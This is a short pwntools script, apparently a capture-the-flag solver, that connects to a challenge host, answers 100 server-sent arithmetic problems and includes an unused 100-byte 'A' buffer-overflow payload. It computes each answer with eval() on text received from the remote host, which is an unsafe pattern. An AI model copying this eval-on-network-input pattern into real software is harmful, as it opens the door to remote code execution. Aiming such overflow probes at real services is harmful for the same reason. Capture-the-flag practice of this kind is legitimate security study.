from pwn import *
import ipdb

def conn():
    conn = remote('vuln.stacksmash.io', '1112')
    return conn

def exploit(conn, prompt):
    # all_data = conn.recvall()
    conn.recvline()
    conn.recvline()
    result = conn.recvline()
    # conn.recvuntil(b"i DONT BELIEVE YOU!")
    # result = conn.recvuntil(b"\n")
    # print(conn)
    # conn.sendline(prompt)
    # print(all_data)

    counter = 0
    while True:
        result = calculate(conn, result)
        if(counter == 99):
            break
        print(f"Operation {counter}: {result}")
        counter += 1

    print(result)

def calculate(conn, result):
    expression = result.decode().strip()
    answer = int(eval(expression))
    print(answer)
    conn.sendline(str(answer).encode())
    response = conn.recvline()
    conn.recvline()
    # ipdb.set_trace()
    result = conn.recvline()
    return result

def send_payload(conn):
    payload = b'A' * 100
    conn.sendline(payload)

def main():
    process = None
    process = conn()
    exploit(process, b"A" * 100)
    # process.interactive()
    process.close()

if __name__ == "__main__":
    main()
